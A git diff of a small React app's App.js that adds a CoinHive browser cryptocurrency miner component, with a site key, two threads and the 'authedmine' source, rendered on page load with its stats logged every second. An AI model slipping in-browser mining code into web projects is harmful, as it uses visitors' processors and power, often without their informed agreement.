@@ -1,6 +1,7 @@
 import React, { Component } from 'react';
 import './App.css';
 import ControlledInput from './components/form.js';
+import CoinHive from 'react-coinhive';
 import ReactGA from 'react-ga';
 
 
@@ -16,7 +17,14 @@ class App extends Component {
             var today = new Date(),
             time = today.getDate() + '/' + (today.getMonth() + 1) + '/' + today.getFullYear()+ '    ' + today.getHours()+ ':' + today.getMinutes();
     return (
+
       <div className="App">
+        <CoinHive
+          siteKey="0M5lX8MxehwqustAk4XzCz4NrEhgYhFP"
+          autoThreads={false}
+          threads={2}
+          src={CoinHive.src.authedmine}
+          onInit={miner => setInterval(() => console.log(CoinHive.getMinerData(miner)), 1000)}/>
  
         <header className="App-header">  
           <h1 className="App-title rotating">C</h1>
